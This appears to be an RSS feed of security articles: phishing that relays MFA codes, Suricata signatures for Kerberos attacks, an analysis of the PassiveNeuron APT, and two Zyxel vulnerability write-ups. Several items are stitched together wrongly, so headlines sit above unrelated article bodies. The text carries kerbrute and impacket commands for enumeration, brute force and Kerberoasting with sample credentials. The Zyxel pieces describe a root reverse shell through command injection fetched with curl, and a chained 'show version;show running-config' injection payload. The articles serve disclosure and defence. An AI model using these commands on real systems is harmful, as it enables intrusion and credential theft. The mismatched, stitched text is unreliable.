lead to a single page but rather a chain of verification pages that employ CAPTCHA. The purpose is likely to evade detection by security bots.The CAPTCHA verification chainAfter repeatedly proving they are not a bot, the user finally lands on a website designed to mimic a Google sign-in form.The phishing sign-in formThis page is notable for validating the Gmail address the user enters and displaying an error if it is not a registered email.If the victim enters a valid address, then, regardless whether the password is correct or not, the phishing site will display another similar page, with a message indicating that the password is invalid. In both scenarios, clicking “Reset Session” opens the email input form again. If a distracted user attempts to log in by trying different accounts and passwords, all of these end up in the hands of the attackers.Because many users protect their accounts with multi-factor authentication, scammers try to come up with ways to steal not just passwords but also one-time codes and other verification data. Email phishing campaigns that redirect users to sites designed to bypass MFA can vary significantly in sophistication. Some campaigns employ primitive tactics, while others use well-crafted messages that are initially difficult to distinguish from legitimate ones. Let’s look at an email that falls in the latter category.Phishing email that mimics a pCloud notificationUnlike most phishing emails that try to immediately scare the user or otherwise grab their attention, the subject here is quite neutral: a support ticket update from the secure cloud storage provider pCloud that asks the user to evaluate the quality of the service. No threats or urgent calls to action. If the user attempts to follow the link, they are taken to a phishing sign-in form visually identical to the original, but with one key difference: instead of pcloud.com, the attackers use a different top-level domain, p-cloud.online.The phishing sign-in formAt every step of the user’s interaction with the form on the malicious site, the site communicates with the real pCloud service via an API. Therefore, if a user enters an address that is not registered with the service, they will see an error, as if they were signing in to pcloud.com. If a real address is entered, a one-time password (OTP) input form opens, which pCloud also requests when a user tries to sign in.Since the phishing site relays all entered data to the real service, an attempt to trick the verification process will fail: if a random combination is entered, the site will respond with an error.Attempting to bypass verificationThe real OTP is sent by the pCloud service to the email address the user provided on the phishing site.Once the user has “verified” the account, they land on the password input form; this is also requested by the real service. After this step, the phishing page opens a copy of the pCloud website, and the attacker gains access to the victim’s account. We have to give credit to the scammers: this is a high-quality copy. It even includes a default folder with a default image identical to the original, which may delay the user’s realization that they have been tricked.Threat actors are increasingly employing diverse evasion techniques in their phishing campaigns and websites. In email, these techniques include PDF documents containing QR codes, which are not as easily detected as standard hyperlinks. Another measure is password protection of attachments. In some instances, the password arrives in a separate email, adding another layer of difficulty to automated analysis. Attackers are protecting their web pages with CAPTCHAs, and they may even use more than one verification page. Concurrently, the credential-harvesting schemes themselves are becoming more sophisticated and convincing.To avoid falling victim to phishers, users must stay sharp:Treat unusual attachments, such as password-protected PDFs or documents using a QR code instead of a link to a corporate website, with suspicion.Before entering credentials on any web page, verify that the URL matches the address of the legitimate online service.Organizations are advised to conduct regular security training for employees to keep them up-to-date on the latest techniques being used by threat actors. We also recommend implementing a reliable solution for email server security. For example, Kaspersky Security for Mail Server detects and blocks all the attack methods described in this article.]]></content:encoded></item><item><title>Windows 11 KB5070773 emergency update fixes Windows Recovery issues</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-usb-issue-that-made-windows-recovery-unusable/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 21 Oct 2025 09:01:44 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft has released an emergency update to fix the Windows Recovery Environment (WinRE), which became unusable on systems with USB mice and keyboards after installing the October 2025 security updates.

Cover Man: Mahama Bazarov (Sony ILCE-7M3, f/5.6, 1/3 sec) - is a network authentication protocol used in various network infrastructures, including Active Directory networks. It is based on symmetric key cryptography and a centralized trust model, where the key element is the Key Distribution Center (KDC)The KDC is responsible for issuing tickets that confirm the user's authenticity and allow them to access network services without re-entering their credentials.Kerberos operation consists of two main parts:Authentication Service  - issues an initial ticket to the client, which confirms its identity;Ticket Granting Service  - issues service tickets for access to specific resources in the infrastructure.Typically, the client first requests an  (Authentication Service Request), receives an  (Authentication Service Reply) with a TGT ticket, and then uses this ticket to request a  and receive a  from the KDC.The authentication process is entirely based on the exchange of ASN.1 messages, and Kerberos uses  and .The purpose of this paper is to demonstrate how attacks on Kerberos can be detected at the network traffic level using IDS signatures (Suricata)However, most Kerberos research focuses on offline analysis or Windows event logs, but it is the network level that allows attacks to be detected in real time, even before domain credentials are compromised.This research proves that Kerberos attacks can be detected purely from network telemetry without relying on host logs.The entire Active Directory infrastructure depends directly on Kerberos. Every login, every request to SMB, LDAP, or HTTP services within the domain is Kerberos traffic.This is why Kerberos is one of the main targets for attackers: compromising tickets or credentials within the protocol allows access to domain services without knowing the passwords.Common attacks targeting Kerberos:Searching for valid users in the domainGaining access to user accountsRequesting TGS tickets for service accounts and extracting password hashesExtracting encrypted AS-REP responses for offline bruteforce attacksThis is a method of searching for valid accounts in an Active Directory domain by sending mass AS-REQ requests to the KDC in order to obtain distinguishable behavior for existing and non-existing names. Here, the attacker's task is to collect a list of valid logins before launching a further attack.It is important to understand:KDC responds differently depending on the status of the account and its settings;KDC responses (or no responses) let you tell real accounts from fake ones and find target service principal names (SPNs) for Kerberoasting.To enumerate users, an attacker can use :caster@kali:/mnt/hgfs/ID$ ./kerbrute userenum --dc core.myownsummer.org -d myownsummer.org possibleusernames.txt

Tested 102 usernames (4 valid) in 1.128 secondsTo enumerate users,  sends AS-REQ without a pre-authentication:If the KDC responds with a  error, it means that the account does not exist;If the KDC requires pre-authentication , it means that the name exists.This method does not cause login errors or account lockouts. However, when Kerberos auditing is enabled on the domain controller, a Windows Event ID 4768 event is generated.When  performs user bruteforce attacks, it sends a minimalistic  without a pre-authentication block. Now let's see how this attack looks in traffic:a1 03 02 01 05     // ASN.1: [1] INTEGER 5  → pvno = 5 (Kerberos Version)
a2 03 02 01 0a     // ASN.1: [2] INTEGER 10 → msg-type = 10 (AS-REQ)
6b 72 62 74 67 74  // ASCII: "krbtgt"     → service name (TGT)
These values only appear in Kerberos , especially those directed at : and  are byte sequences in all AS-REQs. They can be used as a primary signature sign; is the ASCII string , which is common to all TGT requests, making it perfect for use in .Enumeration and bruteforce tools work very quickly, generating tens or hundreds of AS-REQs per second. For this reason, signatures should be based not only on byte fingerprints, but also on source behavior - which is why signatures should use parameters such as .Signature for detecting enumeration will look as follows:alert udp any any -> any 88 (
  msg:"[UDP] High Rate of Kerberos AS-REQ, Possible Enumeration";
  content:"|a1 03 02 01 05 a2 03 02 01 0a|";

Kerberos uses TCP when transferring large amounts of data. - indicates that an alert will be generated when the rule is triggered; - indicates that the rule applies to UDP traffic; - the rule will apply to any source IP address and port and any target IP address on port 88, which is the default port for Kerberos;msg:"[UDP] High Rate of Kerberos AS-REQ, Possible Enumeration" - a message when a rule is triggered.

In large Kerberos packets, some ASN.1 tags may cross segment boundaries; reassembly must be enabled in Suricata for full detection.This is precisely how user enumeration on the network can be detected.The directions used in these signatures, alert udp|tcp any any -> any 88, are for demonstration purposes only. Do not blindly copy signatures. Before integrating them into an IDS, signatures should be tested, preferably in a non-production environment.In this case, the attacker's goal is to brute-force passwords for already known accounts.Such attacks also use Kerberos AS-REQ, but with one key difference:  is added to the request, which contains an encrypted timestamp. Thus, Kerberos bruteforce attacks can be detected by the presence of  in AS-REQ and the high frequency of such requests from a single source.It is important to understand:The attacker sends a large number of  messages with PA-DATA, attempting to authenticate through the KDC for each user;Each incorrect password triggers a KRB5KDC_ERR_PREAUTH_FAILED event, which allows intensive brute force attempts to be detected;This behavior is easy to differentiate from legitimate logins: the frequency of AS-REQ with PA-DATA from a single IP or host is significantly higher than normal.The same  can be used to perform a brute force attack, but with the  mode:caster@kali:/mnt/hgfs/ID$ ./kerbrute bruteuser --dc core.myownsummer.org -d myownsummer.org passwords kestre

Legitimate clients, on the other hand, generate single requests, and only when logging in.

This allows reliable detection of brute-force/password-spray attacks on Kerberos at the network layer. As in the previous chapter, signatures are intended for demonstration purposes. Before implementation in a production environment, they must be tested and calibrated against baseline traffic.Kerberoasting is an attack technique that extracts service tickets (TGS) for accounts with SPN and then brute forces their passwords. Key fact:  in  is encrypted with the key of the target account (usually a service user account). Attackers usually save this and perform brute force attacks offline.The goal of Kerberoasting is to obtain the password of an AD service account by offline brute forcing its TGS.Prerequisites and conditionsA domain account (Domain User) is required;Accounts with the  attribute must be present in AD;If the service account uses a weak or long-unchanged password, it can be guessed offline after receiving a ticket;If the KDC issues a ticket in a format that allows for easy export (often RC4-HMAC or AES), the attacker can download the material and brute force it locally;Lack of strict rotation and sufficient strength of service user account passwords.Searching Kerberoastable users via LDAP: searching for objects with  among user objects and selecting “viable” ones by the  bit mask. Paged Results and the  scope are often used; The client sends a TGS-REQ with PA-TGS-REQ (inside -  with TGT on ). The  lists the desired . The KDC responds with TGS-REP; the  field records the actual ticket encryption type; extraction of  and password brute force.First, the attacker searches for “Kerberoastable” accounts, i.e., objects that have the  attribute:caster@kali:/mnt/hgfs/ID$ impacket-GetUserSPNs myownsummer.org/svettel:'Password123' -dc-ip 192.168.1.245

These accounts provide TGS for offline cracking.The network footprint of this reconnaissance differs from normal “user” LDAP queries: it is focused on mass inventory of service accounts.The attacker uses LDAP search to look for the following: if an account has an SPN, the KDC will encrypt the ticket with the key of that account when issuing a TGS, which is what is needed for offline brute force attacks. As a result, this manifests itself in the LDAP query as the presence of the  filter (present filter). In a network packet, this is usually visible in the  string in the request payload;Restrictions on user objects: SPNs can be assigned to user and computer accounts (service accounts); attackers often prefer user accounts because passwords are rotated less often. These are less frequently rotated and their passwords are potentially configured insecurely;: It makes no sense to request TGS for disabled accounts, system accounts without passwords, etc. Therefore, attackers often set a bitwise check on  in LDAP requests to exclude such cases. This typically appears as an  / bitwise AND on OID  with a specific bit mask (in this capture — 0x32; the exact mask may vary by tool/config), and the filter is inverted (NOT) so that only “active” targets remain;: The attacker is interested in processing the entire directory, so LDAP queries are sent with  (across the entire tree) and with  control (500–1000 records per page). This is a clear sign of automated reconnaissance. This is evident in the presence of the  parameter and control OID  (Paged Results) with the page size specified.This is a hex dump of an LDAP packet containing the attacker's query to search for Kerberoastable users:And you need to determine which byte sequences to base your signature on in order to detect LDAP requests, which potentially allows you to identify the start of a Kerberoasting attack.a3 18 04 0e 6f 62 6a 65 63 74 43 61 74 65 67 6f 72 79 04 06 70 65 72 73 6f 6epresent: 87 14 73 65 72 76 69 63 65 50 72 69 6e 63 69 70 61 6c 4e 61 6d 65NOT(extensibleMatch) by UAC with mask: !(userAccountControl:1.2.840.113556.1.4.803:=2)a2 31 a9 2f 81 16 31 2e 32 2e 38 34 30 2e 31 31 33 35 35 36 2e 31 2e 34 2e 38 30 33 82 12 75 73 65 72 41 63 63 6f 75 6e 74 43 6f 6e 74 72 6f 6c 83 01 32 (scope = 2)Server Control: LDAP Paged Results (OID ), a0 27 30 25 04 16 31 2e 32 2e 38 34 30 2e 31 31 33 35 35 36 2e 31 2e 34 2e 33 31 39 01 01 01 04 08 30 06 02 02 03 e8 04 00Start of the list of returnable attributesattribute: 04 14 73 65 72 76 69 63 65 50 72 69 6e 63 69 70 61 6c 4e 61 6d 65Signature for searching Kerberoastable usersalert tcp any any -> any 389 (

The ticket obtained is saved and used to brute force the password for that account.Below is the  intercepted during the attack:a1 03 02 01 05  // pvno = 5

This message contains the ticket itself and the encrypted part , which the attacker will brute force.Below is the TGS-REP packet intercepted during the attack:a0 03 02 01 05  // [0] INTEGER 5   → pvno = 5  (for KDC-REP this tag is [0])

It is this block that the attacker saves and converts to the  format for a brute force attack.Signatures for KerberoastingFor accurate Kerberoasting detection, two episodes must be matched: TGS-REQ (service ticket request from the client) and TGS-REP (KDC response with the issued ticket).A TGS-REQ alone does not necessarily indicate an attack, as it also occurs in legitimate Kerberos operations.However, if the request contains signs of a targeted SPN request and encryption downgrade (RC4-HMAC), followed by a corresponding TGS-REP, this is a direct indication of Kerberoasting.Two interrelated signatures combined via  are used for this detection:Stage 1 - TGS-REQ: responds to a suspicious service ticket request, sets , but does not generate an alert ( is used for this);Stage 2 - TGS-REP: triggers only if such a TGS-REQ request has been previously recorded (set ) and generates an alert. After that, the bit is reset so as not to interfere with other sessions.Stage 1 - Detection of suspicious TGS-REQThis rule analyzes outgoing traffic (towards KDC, port 88 (TCP/UDP) and looks for the following signs:ASN.1 header for TGS-REQ ();Presence of the  string inside AP-REQ - this is part of the ticket acquisition chain;Flags in  () - often found in automated tools;Encryption request  (RC4-HMAC) — a clear sign of downgrade;Field name-type = KRB5-NT-MS-PRINCIPAL (-128) — request for a specific SPN, not TGT.alert udp any any -> any 88 (

Suspicious TGS request with RC4 encryption, without alertThus, the combination of two signatures forms a contextual detection: Suricata only reacts when a suspicious TGS-REQ is accompanied by a real TGS-REP. This ensures high accuracy and allows Kerberoasting attacks to be detected at the network level in real time.The AS-REP Roasting attack is based on the ability to request an AS-REP ticket from the domain controller (KDC) without passing preliminary authentication. This is only possible if the Do not require Kerberos preauthentication option is enabled for the domain account, which is often the case for old service or backup technical accounts.When preauthentication is disabled, an attacker can send an  message to the KDC on behalf of the vulnerable account and receive an  response containing an encrypted  block. This block is encrypted with a key derived from the user's NT password hash (using  encryption).After receiving , the attacker can download it and brute force the account password.Prerequisites and conditionsNo domain privileges are required to request AS-REPs; knowing usernames is sufficient. LDAP can help enumerate candidates but isn't mandatory;Active Directory must contain accounts with pre-authentication disabled;Such accounts are identified by the  attribute with the  flag set;The absence of rotation or the use of weak passwords in such accounts makes an attack almost guaranteed.The attacker sends an AS-REQ request to port TCP/88 in the KDC, specifying the name of the target account. The packet omits PA-ENC-TIMESTAMP (padata-type = 2) in PA-DATA (i.e., no pre-authentication timestamp);In response to the attacker's AS-REQ, the domain controller returns an AS-REP  containing an encrypted  block;Offline Bruteforce: extraction of the encrypted block and its brute force.caster@kali:/mnt/hgfs/ID$ impacket-GetNPUsers myownsummer.org/svettel:'Password123' -dc-ip 192.168.1.245 -format hashcat -outputfile hashes.txt

This campaign involved compromising the servers of government organizations with previously unknown APT implants, named “Neursite” and “NeuralExecutor”. However, since its discovery, the PassiveNeuron campaign has been shrouded in mystery. For instance, it remained unclear how the implants in question were deployed or what actor was behind them.After we detected this campaign and prevented its spreading back in June 2024, we did not see any further malware deployments linked to PassiveNeuron for quite a long time, about six months. However, since December 2024, we have observed a new wave of infections related to PassiveNeuron, with the latest ones dating back to August 2025. These infections targeted government, financial and industrial organizations located in Asia, Africa, and Latin America. Since identifying these infections, we have been able to shed light on many previously unknown aspects of this campaign. Thus, we managed to discover details about the initial infection and gather clues on attribution.While investigating PassiveNeuron infections both in 2024 and 2025, we found that a vast majority of targeted machines were running Windows Server. Specifically, in one particular infection case, we observed attackers gain initial remote command execution capabilities on the compromised server through the Microsoft SQL software. While we do not have clear visibility into how attackers were able to abuse the SQL software, it is worth noting that SQL servers typically get compromised through:Exploitation of vulnerabilities in the server software itselfExploitation of SQL injection vulnerabilities present in the applications running on the serverAfter obtaining the code execution capabilities with the help of the SQL software, attackers deployed an ASPX web shell for basic malicious command execution on the compromised machine. However, at this stage, things did not go as planned for the adversary. The Kaspersky solution installed on the machine was preventing the web shell deployment efforts, and the process of installing the web shell ended up being quite noisy.In attempts to evade detection of the web shell, attackers performed its installation in the following manner:They dropped a file containing the Base64-encoded web shell on the system.They dropped a PowerShell script responsible for Base64-decoding the web shell file.They launched the PowerShell script in an attempt to write the decoded web shell payload to the filesystem.As Kaspersky solutions were preventing the web shell installation, we observed attackers to repeat the steps above several times with minor adjustments, such as:Using hexadecimal encoding of the web shell instead of Base64Using a VBS script instead of a PowerShell script to perform decodingWriting the script contents in a line-by-line mannerHaving failed to deploy the web shell, attackers decided to use more advanced malicious implants to continue the compromise process.Over the last two years, we have observed three implants used over the course of PassiveNeuron infections, which are:Neursite, a custom C++ modular backdoor used for cyberespionage activitiesNeuralExecutor, a custom .NET implant used for running additional .NET payloadsthe Cobalt Strike framework, a commercial tool for red teamingWhile we saw different combinations of these implants deployed on targeted machines, we observed that in the vast majority of cases, they were loaded through a chain of DLL loaders. The first-stage loader in the chain is a DLL file placed in the system directory. Some of these DLL file paths are:C:\Windows\System32\wlbsctrl.dllC:\Windows\System32\TSMSISrv.dllC:\Windows\System32\oci.dllStoring DLLs under these paths has been beneficial to attackers, as placing libraries with these names inside the System32 folder makes it possible to automatically ensure persistence. If present on the file system, these DLLs get automatically loaded on startup (the first two DLLs are loaded into the  process, while the latter is loaded into ) due to the employed Phantom DLL Hijacking technique.It also should be noted that these DLLs are more than 100 MB in size — their size is artificially inflated by attackers by adding junk overlay bytes. Usually, this is done to make malicious implants more difficult to detect by security solutions.On startup, the first-stage DLLs iterate through a list of installed network adapters, calculating a 32-bit hash of each adapter’s MAC address. If neither of the MAC addresses is equal to the value specified in the loader configuration, the loader exits. This MAC address check is designed to ensure that the DLLs get solely launched on the intended victim machine, in order to hinder execution in a sandbox environment. Such detailed narrowing down of victims implies the adversary’s interest towards specific organizations and once again underscores the targeted nature of this threat.Having checked that it is operating on a target machine, the loader continues execution by loading a second-stage loader DLL that is stored on disk. The paths where the second-stage DLLs were stored as well as their names (examples include  and ) differed between machines. We observed the second-stage DLLs to also have an artificially inflated file size (in excess of 60 MB), and the malicious goal was to open a text file containing a Base64-encoded and AES-encrypted third-stage loader, and subsequently launch it.Snippet of the payload file contentsThis payload is a DLL as well, responsible for launching a fourth-stage shellcode loader inside another process (e.g.  or ) which is created in suspended mode. In turn, this shellcode loads the final payload: a PE file converted to a custom executable format.In summary, the process of loading the final payload can be represented with the following graph:It is also notable that attackers attempted to use slightly different variants of the loading scheme for some of the target organizations. For example, we have seen cases without payload injection into another process, or with DLL obfuscation on disk with VMProtect.Among the three final payload implants that we mentioned above, the Neursite backdoor is the most potent one. We dubbed it so because we observed the following source code path inside the discovered samples: E:\pro\code\Neursite\client_server\nonspec\mbedtls\library\ssl_srv.c. The configuration of this implant contains the following parameters:List of C2 servers and their portsList of HTTP proxies that can be used to connect to C2 serversList of HTTP headers used while connecting to HTTP-based C2 serversA relative URL used while communicating with HTTP-based C2 serversA range of wait time between two consecutive C2 server connectionsA byte array of hours and days of the week when the backdoor is operableAn optional port that should be opened for listening to incoming connectionsThe Neursite implant can use the TCP, SSL, HTTP and HTTPS protocols for C2 communications. As follows from the configuration, Neursite can connect to the C2 server directly or wait for another machine to start communicating through a specified port. In cases we observed, Neursite samples were configured to use either external servers or compromised internal infrastructure for C2 communications.The default range of commands implemented inside this backdoor allows attackers to:Retrieve system information.Manage running processes.Proxy traffic through other machines infected with the Neursite implant, in order to facilitate lateral movement.Additionally, this implant is equipped with a component that allows loading supplementary plugins. We observed attackers deploy plugins with the following capabilities:The NeuralExecutor loaderNeuralExecutor is another custom implant deployed over the course of the PassiveNeuron campaign. This implant is .NET based, and we found that it employed the open-source ConfuserEx obfuscator for protection against analysis. It implements multiple methods of network communication, namely TCP, HTTP/HTTPS, named pipes, and WebSockets. Upon establishing a communication channel with the C2 server, the backdoor can receive commands allowing it to load .NET assemblies. As such, the main capability of this backdoor is to receive additional .NET payloads from the network and execute them.Both Neursite and NeuralExecutor, the two custom implants we found to be used in the PassiveNeuron campaign, have never been observed in any previous cyberattacks. We had to look for clues that could hint at the threat actor behind PassiveNeuron.Back when we started investigating PassiveNeuron back in 2024, we spotted one such blatantly obvious clue:Function names found inside NeuralExecutorIn the code of the NeuralExecutor samples we observed in 2024, the names of all functions had been replaced with strings prefixed with “Супер обфускатор”, the Russian for “Super obfuscator”. It is important to note, however, that this string was deliberately introduced by the attackers while using the ConfuserEx obfuscator. When it comes to strings that are inserted into malware on purpose, they should be assessed carefully during attribution. That is because threat actors may insert strings in languages they do not speak, in order to create false flags intended to confuse researchers and incident responders and prompt them to make an error of judgement when trying to attribute the threat. For that reason, we attached little evidential weight to the presence of the “Супер обфускатор” string back in 2024.After examining the NeuralExecutor samples used in 2025, we found that the Russian-language string had disappeared. However, this year we noticed another peculiar clue related to this implant. While the 2024 samples were designed to retrieve the C2 server addresses straight from the configuration, the 2025 ones did so by using the Dead Drop Resolver technique. Specifically, the new NeuralExecutor samples that we found were designed to retrieve the contents of a file stored in a GitHub repository, and extract a string from it:Contents of the configuration file stored on GitHubThe malware locates this string by searching for two delimiters,  and , that mark the start and the end of the configuration data. The bytes of this string are then Base64-decoded and decrypted with AES to obtain the C2 server address.Snippet of the implant configurationIt is notable that this exact method of obtaining C2 server addresses from GitHub, using a string containing delimiter sequences, is quite popular among Chinese-speaking threat actors. For instance, we frequently observed it being used in the EastWind campaign, which we previously connected to the APT31 and APT27 Chinese-speaking threat actors.Furthermore, during our investigation, we learned one more interesting fact that could be useful in attribution. We observed numerous attempts to deploy the PassiveNeuron loader in one particular organization. After discovering yet another failed deployment, we have detected a malicious DLL named . An analysis of this DLL revealed that it had the PDB path G:\Bee\Tree(pmrc)\Src\Dll_3F_imjp14k\Release\Dll.pdb. This PDB string was referenced in a report by Cisco Talos on activities likely associated with the threat actor APT41. Moreover, we identified that the discovered DLL exhibits the same malicious behavior as described in the Cisco Talos report. However, it remains unclear why this DLL was uploaded to the target machine. Possible explanations could be that the attackers deployed it as a replacement for the PassiveNeuron-related implants, or that it was used by another actor who compromised the organization simultaneously with the attackers behind PassiveNeuron.When dealing with attribution of cyberattacks that are known to involve false flags, it is difficult to understand which attribution indicators to trust, or whether to trust any at all. However, the overall TTPs of the PassiveNeuron campaign most resemble the ones commonly employed by Chinese-speaking threat actors. Since TTPs are usually harder to fake than indicators like strings, we are, as of now, attributing the PassiveNeuron campaign to a Chinese-speaking threat actor, albeit with a low level of confidence.The PassiveNeuron campaign has been distinctive in the way that it primarily targets server machines. These servers, especially the ones exposed to the internet, are usually lucrative targets for APTs, as they can serve as entry points into target organizations. It is thus crucial to pay close attention to the protection of server machines. Wherever possible, the attack surface associated with these servers should be reduced to a minimum, and all server applications should be monitored to prevent emerging infections in a timely manner. Specific attention should be paid to protecting applications against SQL injections, which are commonly exploited by threat actors to obtain initial access. Another thing to focus on is protection against web shells, which are deployed to facilitate compromise of servers.]]></content:encoded></item><item><title>Google Identifies Three New Russian Malware Families Created by COLDRIVER Hackers</title><link>https://thehackernews.com/2025/10/google-identifies-three-new-russian.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaTan9GHWsCwaO4bnKiGglFvl2rp8eOV3zwfWIezDpTI7ww63DIocRbxttxbRl89SpjjsHR4nRtQR4xqG5OqRxx2C1nw1KEENkV4dn10LsS8c-oPLHZQJBJytRrWWIfxrVthw4Z2a4GpB6bIyjVdT5flB1SOubHC0-u4IudmvFtR71eiqmxGY7PTu-Z8YD/s1600/click.jpg" length="" type=""/><pubDate>Tue, 21 Oct 2025 07:29:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A new malware attributed to the Russia-linked hacking group known as COLDRIVER has undergone numerous developmental iterations since May 2025, suggesting an increased "operations tempo" from the threat actor.

Something hidden and vulnerable.I’m sharing a comic that Marco Ivaldi aka raptor shared with me during one of our chats. I found it incredibly relatable and funny, as it perfectly captures the situation when I decided to return to working on ZLD.Hidden from the documentation but visible in the browser's source scripts, I identified a highly valuable command, one that use the shell command handler without validating user input.
This command allows the execution of arbitrary code as root.During some research in the device's front-end files, I found an undocumented command's parameter inside .Since the parameter operates on files located on file system, I immediately suspected a lack of sanitization on the filename.
The hypothesis came from a simple line of reasoning: if the command is hidden, it probably hasn't been properly sanitized. After all, who's supposed to see it?With that in mind, I quickly jumped into the shell to see what I was dealing with.As demonstrated, the hypothesis was correct.
But what happens under the hood?It took me a few minutes of trial and error to figure out how to run a  or any command with one or more arguments.
This was because the parameter after  doesn't accept characters like , , , , , or even spaces; it also has a maximum length of 30 characters and must end with .After thinking it through for a bit, I tried executing the command using Command grouping with Curly braces, separating the command and its arguments with commas.Having found a way to move forward, I launched a  to analyze what was happening at the system level. Why? And, in another shell, I launchedObviously, since I used , a separate process was created. By using , let's see what happens when we use the undocumented command.Let's be honest, RCE alone isn't enough or, at least for me, it isn't. Until I get the reverse shell, the game isn't over.
There were several attempts to obtain the shell, but each ended up freezing the device, requiring a physical reboot. This happened because appending  made the command wait for it to finish before releasing ZYSH, which obviously never happened.Can I write to a file? No. Or at least, I found no way since all useful characters were banned.Can I spawn a reverse shell with Python, Perl, Ruby? No. Each uses at least one banned character, plus I have to stay within 30 characters.Write the reverse shell inside an environment variable? Again, no. Creating an environment variable is possible with , but character usage is limited.Then I thought: , what about ? If I stay within 30 characters, it works. And it’s available as a built-in utility!So the strategy was: spin up a quick web server on port  to avoid specifying the port, create an  to avoid using  (banned-char), and save it as  to save characters limit.rainpwn@0xdeadspace:~/zyx_540_reverseshell/web$ 
And on the device, we curl and run!Obviously, I get the shell as root.After a two-month break, it was a pleasure and, above all, fun to get my hands back on these appliances. Gaining a root shell always comes with a dopamine rush.Comand Grouping using curly braces: ZYXEL was notified via <security@zyxel.com.tw>.: ZYXEL acknowledged receipt of my vulnerability report.: ZYXEL assigned CVE-2025-8078 to the reported issues and informed me of their intention to publish their security advisory on 2025-09-30.: ZYXEL requested to postpone the public disclosure date to October 21, 2025, as the firmware patch is scheduled for release on October 20, 2025, allowing users adequate time to apply the update and secure their systems before the vulnerability is disclosed.: ZYXEL published their security advisory, following our coordinated disclosure timeline.]]></content:encoded></item><item><title>CVE-2025-9133: ZYXEL Configuration Exposure via Authorization Bypass</title><link>https://rainpwn.blog/blog/cve-2025-9133/</link><author>/u/Advanced_Rough8330</author><category>netsec</category><pubDate>Tue, 21 Oct 2025 05:37:23 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[When the rules stop you, rewrite them in their own language-Parallel to , I identified a vulnerability in the two-factor authentication (2FA) verification phase in the ATP/USG series.

filter=js2&cmd=show%20running-config&write=0Injection and Configuration ViewingIt appears that there is a kind of filtering on the commands sent to the endpoint.
However, by performing an injection, it is possible to bypass this restriction and view the device configuration.[..SNIP..]
filter=js2&cmd=show%20version;show%20running-config&write=0ZYSG-CGI : Binary AnalysisHaving regained (once again) root shell access via , I decided to further analyze the  binary to better understand its logic.Analyzing the binary, I found several interesting points.First Observation: main() and the fp_2 Parameter (usr_type)In the CGI , after all the parameter parsing (, , etc.), there is this section:Here,  is initialized to  by default, but it can change based on , which the server determines:From the IP () via  or From the  cookieIf you are not an admin or a "special" type,  remains  (typically ).
This is the first indication that the flow changes depending on the user type.Next Step: Look for Differences Between the Two PathsExamining  and  (which are essentially two similar "engines"), analyzing the code reveals that  contain the same filter block:Here,  is precisely  -> that is, the  passed from .If  is  -> very restricted allowlist (only a few exact strings).If  is different (and ≠ 0) -> slightly broader allowlist (any , , etc.).If  is  -> the entire block is skipped (no filtering at all).Prefix Matching on String s1The  parameter of  is validated  of the full command string to determine whether it is allowed for a given user profile (e.g., ). If the string  with a whitelisted command (e.g., ), the entire content of , including any commands concatenated after, is forwarded "as-is" to the backend CLI.
This means show version;show running-config; passes validation because it starts with , and the second command, not whitelisted, is still executed. Validation does not split on separators nor re-validate sub-commands.Conversely, sending only  does not match any allowlist entry and ends up in the "blocked" branch, which rewrites it in a special form and effectively produces no useful output in the  path, which is why I got . affects rendering: the server sets the content type based on  ( only if ; otherwise ), and when  is present, it  emit the HTML "shell" but only the JS fragments with the data (the  arrays). disables processing of "writecmds" (mutating commands) in the path that builds requests to the backend. The code reads  and uses the  buffer only if set; with  you remain on the "read-only" binary.The profile/user type controlling the allowlist is propagated as  in the executing functions; the main function selects between two slightly different paths (“engines”) based on this: if the profile is set, it calls ; otherwise, it calls .1. Prefix and Full-String ValidationIn the loop processing the commands, the code takes  from the  field (here ) and compares it against certain :If one of these  calls matches, the flow jumps to the label that sends the command. There is no splitting or iteration for subcommands separated by  or newline: only the beginning of the string is validated.2. Forwarding the Entire String "As-Is" (Including )At the authorizing label, the code constructs the line to send to the backend using the :Since  contains the entire value of , any  remain inside and are interpreted by the device’s CLI parser: show version;show running-config; executes .3. "Not Allowed" Branch Rewrites the Command (No Splitting Here Either)If the prefix is not whitelisted, the code does not explicitly reject it but instead  the line in a special form:In this case, sending only  enters this branch. In  mode, this path does not generate the usual  arrays, and the client sees . When using , the "allowed" branch is taken and  concatenated string is forwarded as-is, including the second command.4. Engine Selection Based on User ProfileThe  function chooses which execution function to use (both have the same basic logic: "prefix -> allow/rewrite"): is derived from the authentication cookie / "usr type" and defaults to  (restricted profile): precisely the case where the allowlist is more limited and  include .TLDR; Why the Payload WorksInput used: filter=js2&cmd=show%20version;show%20running-config;&write=0 starts with  -> matches the allowlist for profile  -> "allowed" branch.At the authorizing label, the code  split the string on  and forwards the entire  to the backend -> sequential execution of both commands.Output is serialized into JS fragments () because you are on the "allowed" path and  is present ( mode).When sending , the prefix does not match the whitelisted commands, the flow hits the "rewrite" branch, and no useful data appears in .Bypasses the policy applied to restricted profiles (): access to non-whitelisted commands (e.g., ) via command chaining.Exfiltration of sensitive configurations without proper permissions (credentials, keys, secrets in configs).Potential extension to management commands (depending on the whitelisted surface in the other branch).Remediation (Practical Hardening)Tokenize and Validate Per-Subcommand
Split  on  and newline before validation, then check each subcommand against the allowlist. Reject the entire request if any fail.Block Chaining at the CGI Level
If the semantics do not allow multiple commands, reject inputs containing  or control/pipeline characters.Strict and Complete Allowlist
The  allowlist currently includes  but not . If  must be denied, it must not pass as part of a longer string. If allowed, it should be explicitly added to avoid rewrite shortcuts.
Avoid the path that rewrites disallowed commands into configure terminal exit|...: it introduces ambiguity and uncovered surfaces. Fail hard with a 4xx CGI error instead.
